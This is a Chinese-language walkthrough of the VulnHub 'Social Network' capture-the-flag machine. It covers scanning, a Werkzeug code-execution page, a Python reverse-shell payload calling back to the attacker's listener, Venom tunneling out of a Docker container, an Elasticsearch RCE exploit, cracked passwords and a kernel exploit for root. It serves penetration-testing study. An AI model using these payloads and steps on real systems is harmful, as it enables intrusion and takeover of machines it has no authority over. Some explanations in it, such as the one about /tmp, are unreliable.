# 相关信息

靶机介绍网站：[BoredHackerBlog: Social Network ~ VulnHub](https://www.vulnhub.com/entry/boredhackerblog-social-network,454/)

靶机下载网址：https://download.vulnhub.com/boredhackerblog/medium_socnet.ova

靶机ip：192.168.195.171

kali_ip：192.168.195.170

靶机的内网（靶机1：172.17.0.3，靶机2：172.17.0.1,靶机3：172.17.0.2）

# 文字版思路

这是非常重要的，我们必须了解打靶的思路，并且将打该靶机的思路进行明确的==思考，拓展和总结==。

## 抽象的思路

1. 发现主机(可以通过多种方式，但是必须是进行发现)

2. 收集相关信息：
    1. 端口：
        1. 开放的端口
        2. 开放的服务和相关版本（可能存在相关的历史漏洞）
        3. 有些端口`甚至是隐藏的`，需要你进入之后上传检测脚本。
    2. web服务
        1. url
        2. 相关后台
    3. 甚至系统版本

3. 然后利用收集的信息进行漏洞的进入，然后循环往复。直到拿到权限。==但是一定要注意，信息搜集至关重要，它决定你可以利用的漏洞数量和攻破的可能。==

    （在实现这两个步骤（信息收集，漏洞利用）是需要各种技术和知识，但是一定是围绕着两个展开）

## 具体的思路

### 信息的收集：第一次

1. 扫描到靶机192.168.195.171，发现开有ssh（必须直接进行爆破）和5000端口-->进一步发现对于的服务和相关版本。发现5000为一个http.
2. 访问网站查看是否有默认的网站，同时扫描后台，发现可执行代码漏洞

### 漏洞利用：第一次

1. 上传python的payload，进入靶机。

### 信息的收集：第二次

1. 权限的查看，发现入侵的==靶机1==为靶机的内网docker（==如何发现的很重要==）。相当以内网渗透
2. 通过发现内网其他的主机172.17.0.1,    172.17.0.2（==bash脚本==）。由于是内网渗透需要利用的代理技术，是kali利用内网的靶机1为跳板来对其他内网靶机进行信息的收集
3. 对内网靶机2进行信息收集发现，和我们对==靶机==的信息搜集是一样。发现靶机2就是靶机对其所在内网开放的ip。
4. 同时对靶机3进行信息搜集，发现端口运行Elasticsearch服务（出现过漏洞）。

### 漏洞利用：第二次

1. 通过elasticsearch的远程执行漏洞，进入靶机3

### 信息的收集：第三次

1. 发现有个password文件，可解密。
2. 尝试第一次信息搜集的ssh端口，尝试连接。进如ssh中，发现为低权限用户（需要提权，而提权一般可以通过内核的漏洞进行），同时发现linux版本很低（）

### 漏洞利用：第三次

1. 上载低版本内核的漏洞直接提权，到处结束。

（注意：在正真的渗透过程中，信息收集可能是反复交替，相互推进的不可能像这个思路这么流畅。可能出现发现不了漏洞需要进一步进行返回去再次进行信息搜集的情况）

## 如何提权：

利用系统内核漏洞（低版本）

# 图片版思路/步骤

## 信息的搜集:第一次

1. 由于靶机同目标主机在同一个网段内，==所以采用arp-scan更为合理==。确认靶机的ip为：==192.168.195.171==


###### <img src="http://image.cchl.fun/kali_image/image-20230515155507069.png" alt="image-20230515155507069" style="zoom: 67%;"  >

1. 进行全端口扫描，发现相关服务

    <img src="C:\Users\27711\AppData\Roaming\Typora\typora-user-images\image-20230515155839432.png" alt="image-20230515155839432" style="zoom:50%;" />

  2. 发现打开的相关的端口22，和5000端口。使用nmap进行版本号等详细版本的扫描。发现5000端口为http端口，同时可以发现该http端口是由python2写的。采用的 `werkzeug` web开发框架                                                                          [==返回==](#back3)<a id='pic'></a>

     <img src="http://image.cchl.fun/kali_image/image-20230515161033124.png" alt="image-20230515161033124" style="zoom: 50%;" />

   3. 尝试浏览器访问该网站，看是否由默认的登录界面。同时进过测试后没有明显的漏洞（我们是可以通过输入字符来控制网页的输出内容，所以我们进行ssti漏洞测试是非常关键的。但是很遗憾没有搜获）

       <img src="http://image.cchl.fun/kali_image/image-20230515161518986.png" alt="image-20230515161518986" style="zoom:50%;" />

   4. 那么就进行web渗透几乎必进行的相关文件扫描查看是否有后台。这里使用dirsearch工具。发现后台admin,并进行的访问，可以明显的看出这个一个开发测试的网页，这是极其不安全的。通过页面的信息明显可以判断出为一个远程代码执行的漏洞。

      <img src="http://image.cchl.fun/kali_image/image-20230515161642498.png" alt="image-20230515161642498" style="zoom:50%;" />

      <img src="http://image.cchl.fun/kali_image/image-20230515161740751.png" alt="image-20230515161740751" style="zoom: 50%;" />

## 漏洞入侵：第一次

   1. 打开本地监听，上传payload（这个payload只包含python只带的payload）,可以看到反弹成功.

       ```python
       import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.195.170",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
       ```

       <img src="http://image.cchl.fun/kali_image/image-20230515164157096.png" alt="image-20230515164157096" style="zoom: 50%;" />

## 信息的收集：第二次

   1. 进行相关数据，权限的收集。通过浏览常规的信息我们发现。我们反弹拿下的用户为app==,它就是root权限==。这是非常不应该的，所以我们可以猜为可能是存在5000端口的http服务不是部署在真实的ubuntu上，而是通过docker等虚拟化容器进行实现的部署。

       所以我们接下来的目标就是从这个隔离的docker中进入的真实的靶机换进中。

       <img src="http://image.cchl.fun/kali_image/image-20230515173129285.png" alt="image-20230515173129285" style="zoom:50%;" />

       哪我们如何查看我们进入的是否为docker容器？

       1. [cat /proc/1/cgroup](#docker_finder_1)                                            [==点击进行跳转解释==	](#docker_finder_1)					<a id='back1'></a> 

           来查看，如果出现相关的docker回显，就可以百分之百的确定为登陆的是docker用户

       2. ls /.dockerenv

           如果存在该文件，八九不离十为docker容器。

   2. 可通过ip a来进行查看ip：ip a 是ip address命令的缩写相当于ip addr。我们通过查看给命令，可以进一步验证我们是出于docker中的猜想（ip和我们nmap扫到的是不一致的，相当于我们出于在内网之中，所以我们需要进行内网的渗透，来进行获取内网中其它主机的信息和相关的shell。==这就是思路，注意，注意！！！！==）

       <img src="http://image.cchl.fun/kali_image/image-20230515180802639.png" alt="image-20230515180802639" style="zoom:50%;" />

   3. 如何发现相关主机呢？最简单的就是进行ping。由于我们kali中的工具是无法探测到连接靶机所在的内网，所以有两种方法：1，建立隧道            2，在靶机上编写本地的扫描脚本                                 [==点击相关说明==](#chen)                  <a id='back2'></a>

       ```bash
       for i in $(seq 1 10); do ping -c 2 172.17.0.$i; done
       ```

       执行后可以发现有两个内网主机

       <img src="http://image.cchl.fun/kali_image/image-20230515181533703.png" alt="image-20230515181533703" style="zoom:50%;" />

   4. 由于是内网渗透我们需要是使用隧道代理技术，使用已经编译好（release）的venom渗透工具

          1. venom中admin都是运行在kali上来启动监听的，类似于nc                                                  [==工具使用说明==](#back5)<a id='tag5'></a>

              <img src="http://image.cchl.fun/kali_image/image-20230515190626568.png" alt="image-20230515190626568" style="zoom: 50%;" />

   5. 这一步包含三个信息：

          1. kali通过python开启http服务来是venom的相关文件可以被靶机获取。

          2. 靶机下载venom的代理插件(以agent开头的，选择相关的系统版本)，直接在靶机上运行代理（agent...)的脚本。然后成功回连到kali。

          3. kali的监听显示成功。（这里我将agent_linux_x64改名为agent,是为传输方便。）

              <img src="http://image.cchl.fun/kali_image/image-20230515190939081.png" alt="image-20230515190939081" style="zoom:50%;" />

   6. 在venom的监听界面下输入 

          1. show：会显示成功建立隧道的个数。

          2. goto 1：表示接下来对1隧道进行操作。

          3. socks 1080：表示代理将通过本地的1080端口进行转发。

              <img src="http://image.cchl.fun/kali_image/image-20230515192045538.png" alt="image-20230515192045538" style="zoom:50%;" /> 

   7. 使用 `proxychain`这个代理工具。修改代理工具的配置，将工具的的socks5和改为对应的端口 `1080`；

       ![image-20230515192437727](http://image.cchl.fun/kali_image/image-20230515192437727.png)：

       <img src="http://image.cchl.fun/kali_image/image-20230515192445785.png" alt="image-20230515192445785" style="zoom:50%;" />

   8. 配置完毕后对发现的内网的另外两个主机进行探测

          1. 172.17.0.1的扫描

                 1. 通过代理进行扫描，我们可以惊奇的发现 `172.17.0.1` 和我们刚开始扫描真实的靶机nmap是一样的结果 。

                     [==点击比较查看==](#pic)          <a id='back3'></a>

                     <img src="http://image.cchl.fun/kali_image/image-20230515193039496.png" alt="image-20230515193039496" style="zoom:67%;" />

                     <img src="http://image.cchl.fun/kali_image/image-20230515193145380.png" alt="image-20230515193145380" style="zoom: 67%;" />

                 2. 设置好浏览器的代理，我们来查看一下172.17.0.1的http服务来验证我们的惊奇发现。可以发现网站上甚至还包含了我们测试的记录。

                     <img src="http://image.cchl.fun/kali_image/image-20230515194327048.png" alt="image-20230515194327048" style="zoom:50%;" />

                     <img src="http://image.cchl.fun/kali_image/image-20230515194334203.png" alt="image-20230515194334203" style="zoom:50%;" />

          2. 172.17.0.2

                 1. nmap的代理扫描结果：9200一般是==Elasticsearch在使用，可以记住==。在历史上是出现过严重的远程执行漏洞。

                     <img src="http://image.cchl.fun/kali_image/image-20230515194642544.png" alt="image-20230515194642544" style="zoom:67%;" />

                     通过searchsploit进行相关漏洞的搜索，我们选择使用第一个漏洞的`36337.py`

                     <img src="http://image.cchl.fun/kali_image/image-20230515195056101.png" alt="image-20230515195056101" style="zoom:50%;" />


## 漏洞入侵：第二次 /信息的收集：第三次

   1. 执行脚本（==当使用错误的时候，会自动报错和提示的。无需担心脚本如何使用==）。

        `proxychains python2 3633.py 172.17.0.2`。==记得使用代理==

       当连接的172.17.0.2的时候，我们依然可以轻松的发现也是个docker，但是当我们查看相关文件的时候，我们会发现有个文本叫`passwords`，查看后我们以看到为用户和对象的md5加密。在线破解后我们可以发现为：

       john：1337hack

       test：1234test

       admin：1111pass

       root：1234pass

       jane：1234jane

       <img src="http://image.cchl.fun/kali_image/屏幕截图 2023-05-15 195958.png" alt="屏幕截图 2023-05-15 195958" style="zoom: 50%;" />

2. 通过172.17.0.2的password解析，对192.168.195.171靶机尝试进行ssh连接，发现只有john是可以连接，进行权限的查看。可以发现，是不具备提升root的能力的。这个时候我们已经跳出了靶机内部的docker环境。直接进入到了的靶机真实的系统环境。

<img src="http://image.cchl.fun/kali_image/image-20230515202316559.png" alt="image-20230515202316559" style="zoom: 67%;" />

## 漏洞入侵：第三次

   1. 对普通用户进行权限的提升，主要的方法时进行==linux内核漏洞==的利用。通过ssh的连接，我们可以发现linux的内核版本为3.13版本（注意现在的linux内核已经到5.几了），所以通过searchsploit进行相关的漏洞搜索。

         <img src="http://image.cchl.fun/kali_image/image-20230515203231751.png" alt="image-20230515203231751" style="zoom:50%;" />

   2. 我们选取37292.c为漏洞的执行（实战时需要将代码进行一个个的试用来进行判断是否可以利用）。强烈建议在执行脚本的时候，对脚本进行简单的阅读。由于是c脚本，而靶机无法没有gcc无法编译，需要在本机进行编译，然后再上传让靶机可以直接的运行。

         ![image-20230515203850496](http://image.cchl.fun/kali_image/image-20230515203850496.png)

         但是当我们阅读代码的时候会发现一个严重的问题，既从代码的可以看出，在编译后的程序依然会调用gcc编译器。

         ![image-20230515204108142](http://image.cchl.fun/kali_image/image-20230515204108142.png)

         可以发现在脚本中就在这里，lib为一个变量。system编译了一个 `ofs-lib.c`文件，然后将其输出到 `/tmp/ofs-lib.so`。我们可对脚本进行修改，提前对 `ofs-lib.c`进行编译，然后连同编译好的脚本一起上传。

         对脚本的修改。原脚本：

         <img src="http://image.cchl.fun/kali_image/image-20230515225751086.png" alt="image-20230515225751086" style="zoom: 67%;" />

         修改后的脚本：

         <img src="http://image.cchl.fun/kali_image/image-20230515225835931.png" alt="image-20230515225835931" style="zoom:67%;" />

         编译脚本：编译脚本后输出为exp。由于删除了一些代码编译的过程会有错误报出，但是并不影响代码的编译完成。

         <img src="http://image.cchl.fun/kali_image/image-20230515225955101.png" alt="image-20230515225955101" style="zoom:67%;" />

         添加链接库：结合我们删除的是ofs-lib.so连接库，所以我们搜索kali是否有该文件，并将其导入的现在的目录下。然后依然是通过`python -m http.server 8081`这个进行文件的上载到靶机。

         <img src="http://image.cchl.fun/kali_image/image-20230515230241086.png" alt="image-20230515230241086" style="zoom:50%;" />

         <img src="http://image.cchl.fun/kali_image/image-20230515230400306.png" alt="image-20230515230400306" style="zoom:50%;" />

         将两个件移动到/tmp/执行，发现会报错。脚本执行失败。		[==为什么要移动移动到tmp文件夹下==](#cchl)<a id = 'back11'></a>

         <img src="http://image.cchl.fun/kali_image/image-20230515232755333.png" alt="image-20230515232755333" style="zoom:50%;" />

         原因为在kali版本下编译使用的库在靶机无法使用。所以需要下载靶机版本对应的库文件。然后进行编译。对应的库文件下载网址：http://launchpadlibrarian.net/172657656/libc6_2.19-0ubuntu6_amd64.deb。然后再用过python的http上传exp文件

         <img src="http://image.cchl.fun/kali_image/3aeb95ec9d942b7f97c85db89ba62df.jpg" alt="3aeb95ec9d942b7f97c85db89ba62df" style="zoom:50%;" />

​		<img src="http://image.cchl.fun/kali_image/image-20230515233243910.png" alt="image-20230515233243910" style="zoom: 50%;" />

脚本执行完可以看到当前用户的权限变为了root用户，到此靶机完成		

# 相关工具的使用

## 扫描工具

### arp-scan

1. what?

    是一个用于在局域网中扫描IP和MAC地址的命令。

2. 具体实例

    1. arp-scan -l

         `-l`选项用于告诉arp-scan打印完整的结果列表，包括IP地址、MAC地址和设备制造商信息

### dirsearch

1. what?

    来获取目标网站的相关后台

2. 具体实例

    1. dirsearch -u http://192.168.195.5:500

        ​	-u:指定url

## 内网工具

### Venom

1. what?

    用于内网渗透的代理脚本                                                                 [==返回==](#tag5)<a id='back5'></a>

2. 具体实例：

    在GitHub上下载release版本的，admin开头的是在本机运行，agent开头是在内网选择的代理的主机上运行的。具体使用命令，可以通过命令的提示来执行，但是注意（一定要选择一个正确的，符合主机架构的版本，不是都要执行。只选一个就可以了）

    ![image-20230516000841296](http://image.cchl.fun/kali_image/image-20230516000841296.png)
    
    1. ./admin_linux_x64 -lport 9999
    
        本地选择适合本机系统的的admin开头的脚本，同时指定监听端口
    
    2. ./agent_linux_x64 -rhost 192.168.195.170 -rprot 9999
    
        这是在靶机上执行的，需要自己上载。来指定反连的ip和端口

## 其他

### Gcc

1. what?

    C语言的 一个编译器

2. 具体实例：

    1. `gcc -o name c_code.c`：  name编译后的文件名，c_code.c需要编译的c文件

    2. `gcc -o name c_code.c  -Ldir /tmp/csoc.so` ：

        -`Ldir` 选项用于指定编译器在 `dir` 目录中查找库文件，它告诉编译器将目录 `dir` 添加到链接器的库搜索路径中。如果源代码中包含了对库函数的调用，链接器就可以在指定的目录中查找并链接相应的库文件。这个选项通常与 `-l` 选项一起使用，例如 `-L/usr/lib -lmysqlclient` 表示在 `/usr/lib` 目录中查找 `libmysqlclient.a` 或 `libmysqlclient.so` 库文件并链接到程序中

# 相关payload

## 远程执行python自带库的payload来反弹。

<a id='chen'>语法说明</a>

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.195.170",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

## bash脚本

```bash
for i in $(seq 1 10); do ping -c 2 172.17.0.$i; done
```

​     	[==返回原位置==](#back2)	

是bash脚本语言，用于linux中；

1. do:是用来标记循环的开始，和done相呼应。循环之间的命令。

2. seq:seq是用于打印一些列的数值`seq [选项]... 首数 增量值 尾数`其中有些是可以省略的。`seq` 命令本身不能直接生成数组，但可以通过 `$(seq ...)` 结合 bash 的命令替换功能，将 `seq` 生成的数列作为一个数组赋值给变量。

     

3. done：表示结束循环如：while,for循环

# 复盘/其他知识点

### 其他知识点

1. <a id = 'docker_finder_1'>cat /proc/1/cgroup</a>				[==返回原位置==](#back1)			

     `/proc` 目录是一种特殊类型的文件系统，通常被称为 procfs。包含了关于操作系统进程组织方式的信息，其中的数字 1 代表的是 init 进程，也就是系统启动时==第一个运行==的进程。

     `/proc/1/cgroup` 文件中存储了关于 init 进程所在的控制组（cgroup）信息，其中每一行代表一个控制组。控制组是 Linux 内核中的一个功能，可以用来限制系统资源的使用，通过将进程分组，可以更好地对进程进行管理和资源分配。在 `/proc/1/cgroup` 文件中，每一行由三个字段组成，分别是控制组的名称、控制组的层级结构和进程 ID（PID）。

2. <a id = 'docker_finder_1'>/.dockerenv</a>			[==返回原位置==](#back1)		

    ​	`/.dockerenv` ==是一个标识当前进程运行在 Docker 容器内的文件==。这个文件在 Docker 容器内部中始终存在，可以通过检查这个文件是否存在来判断当前应用程序是否运行在 Docker 容器内部。通常，一些脚本和工具会使用这个文件来判断当前是否在 Docker 容器中，并作出相应的处理。

3. <a id='cchl'>为什么移动到/tmp/目录下执行</a>                  [==返回原位置==](#back11)

    1. 将代码执行限制在`/tmp/`目录是出于安全的考虑。`/tmp/`目录通常是==可写==的，==因此攻击者可以在该目录中创建和运行恶意代码==，例如将代码执行限制在`/tmp/`目录下，可以避免攻击者在系统的其他位置运行恶意代码，限制了其能够进行攻击的范围，提高了系统的安全性。

    2. 同时我们浏览脚本也是需要在 `/tmp`下执行。
    
    



